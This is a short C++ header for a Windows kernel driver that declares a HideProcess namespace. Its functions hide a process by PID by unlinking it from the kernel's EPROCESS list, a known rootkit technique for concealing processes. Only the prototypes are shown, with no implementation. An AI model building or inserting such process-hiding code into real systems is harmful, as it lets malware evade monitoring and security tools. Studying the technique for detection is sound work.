#pragma once
#include <Ntifs.h>



namespace HideProcess
{
	NTSTATUS HideProcessByProcessID(ULONG pid);

	// De-link the process from the EPROCESS list
	void UnlinkCurrentProcessLinks(PLIST_ENTRY Current);

	// Return the offset of the PID field in the EPROCESS list
	ULONG GetUniquePIDOffSetFromEProcess();
}

